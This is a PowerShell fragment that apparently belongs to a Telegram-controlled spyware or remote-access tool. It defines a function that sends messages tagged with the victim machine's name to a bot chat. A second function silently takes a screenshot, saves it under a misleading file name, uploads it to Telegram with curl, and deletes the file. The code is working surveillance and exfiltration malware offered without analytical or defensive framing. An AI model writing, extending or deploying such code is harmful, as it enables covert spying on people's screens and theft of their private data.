function Send-TG ($text) {
    $url = "https://api.telegram.org/bot$token/sendMessage"
    $body = @{ chat_id = $admin_id; text = "[$env:COMPUTERNAME] $text"; parse_mode = "Markdown" }
    Invoke-RestMethod -Uri $url -Method Post -Body $body
}

function Get-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $path = "$env:TEMP\sys_log.png"
        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose(); $bmp.Dispose()
        curl.exe -F "chat_id=$admin_id" -F "photo=@$path" "https://api.telegram.org/bot$token/sendPhoto"
        Remove-Item $path
    } catch { Send-TG "Ошибка скриншота: $_" }
}

